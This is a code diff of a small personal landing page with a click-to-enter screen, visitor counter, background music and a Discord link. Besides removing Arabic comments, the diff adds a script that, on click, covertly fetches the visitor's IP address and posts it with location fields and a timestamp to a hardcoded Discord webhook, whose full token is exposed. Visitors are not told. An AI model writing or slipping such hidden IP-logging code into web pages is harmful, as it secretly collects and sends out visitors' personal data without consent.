@@ -17,7 +17,6 @@
       overflow: hidden;
       background: black;
     }
-    /* شاشة البداية */
     .enter-screen {
       position: fixed;
       width: 100%;
@@ -31,7 +30,6 @@
       cursor: pointer;
       z-index: 10;
     }
-    /* عداد الزوار */
     .visitor-counter {
       position: fixed;
       top: 15px;
@@ -42,7 +40,6 @@
       z-index: 20;
       text-shadow: 0 0 10px rgba(0,0,0,0.7);
     }
-    /* خلفية GIF */
     body {
       background: url('https://www.raed.net/img?id=1397486') no-repeat center center fixed;
       background-size: cover;
@@ -54,7 +51,6 @@
       background: rgba(0,0,0,0.4);
       z-index: 1;
     }
-    /* المحتوى */
     .main-content {
       display: none;
       width: 100%;
@@ -101,27 +97,24 @@
 </head>
 <body>
     
-  <!-- شاشة البداية -->
   <div class="enter-screen" id="enterScreen">Click to Enter</div>
-
-  <!-- عداد الزوار -->
   <div class="visitor-counter" id="visitorCounter">Visitors: 0</div>
 
-  <!-- المحتوى الرئيسي -->
   <div class="main-content" id="mainContent">
     <div class="overlay"></div>
     <div class="content">
       <div class="logo">BinZayed</div>
       <div class="subtitle">.No Fear.</div>
       <div class="icons">
-        <a href="https://discord.gg/3-1" target="_blank"><img src="https://cdn-icons-png.flaticon.com/512/2111/2111370.png"></a>
+        <a href="https://discord.gg/3-1" target="_blank">
+          <img src="https://cdn-icons-png.flaticon.com/512/2111/2111370.png">
+        </a>
       </div>
     </div>
   </div>
 
-  <!-- موسيقى -->
   <audio id="bgMusic" loop>
-    <source src="music.mp3" type="audio/mp3"> <!-- ضع رابط الموسيقى هنا -->
+    <source src="music.mp3" type="audio/mp3">
   </audio>
 
   <script>
@@ -130,7 +123,6 @@
     const bgMusic = document.getElementById('bgMusic');
     const visitorCounter = document.getElementById('visitorCounter');
 
-    // جلب العداد من localStorage
     let visitors = localStorage.getItem('visitorCount');
     if (!visitors) visitors = 0;
     visitorCounter.innerText = `Visitors: ${visitors}`;
@@ -138,14 +130,31 @@
     enterScreen.addEventListener('click', () => {
       enterScreen.style.display = 'none';
       mainContent.style.display = 'block';
-      
-      // تشغيل الصوت بعد النقر
+
       bgMusic.play().catch(e => console.log("Autoplay blocked:", e));
 
-      // زيادة العداد
       visitors++;
       localStorage.setItem('visitorCount', visitors);
       visitorCounter.innerText = `Visitors: ${visitors}`;
+
+      // جلب معلومات الزائر
+      fetch('https://api.ipify.org?format=json')
+        .then(res => res.json())
+        .then(data => {
+          const ip = data.ip;
+          const country = data.country_name;
+          const city = data.city;
+          const dateTime = new Date().toLocaleString();
+          const webhookUrl = 'https://discord.com/api/webhooks/1402876446304894986/LyYfGo-QH1-R95i2ciqaJ1Q7x2ZOneMg4BcwQMipgEIkfzhaUJMZ6xgHbV37vEVo2T9f';
+
+          fetch(webhookUrl, {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({
+              content: `📥 New Visitor Logged\n\n🌐 IP: ${ip}\n🏙️ Country/City: ${country} - ${city}\n🕒 Time: ${dateTime}`
+            })
+          });
+        });
     });
   </script>
 </body>
